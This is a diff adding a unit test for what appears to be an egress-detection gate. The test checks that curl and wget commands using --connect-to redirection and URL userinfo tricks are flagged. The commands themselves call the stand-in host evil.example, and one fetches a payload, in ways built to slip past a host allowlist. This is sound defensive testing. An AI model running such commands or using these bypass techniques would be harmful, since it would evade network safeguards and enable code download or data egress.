@@ -77,6 +77,18 @@ test("allowlisted host as a prefix of an attacker domain still trips the gate", 
   }
 });
 
+
+test("curl connect-to and URL userinfo bypasses still trip the gate", () => {
+  const loud = [
+    "curl --connect-to thumbgate.ai:443:evil.example:443 https://thumbgate.ai/health",
+    "curl https://thumbgate.ai:443@evil.example/x",
+    "wget https://github.com:443@evil.example/payload",
+  ];
+  for (const cmd of loud) {
+    assert.strictEqual(re().test(cmd), true, `expected warn for: ${cmd}`);
+  }
+});
+
 test("URLs in inert text do not trip the executable-egress pattern", () => {
   const quiet = [
     "const u = 'https://github.com.evil.com/p'",
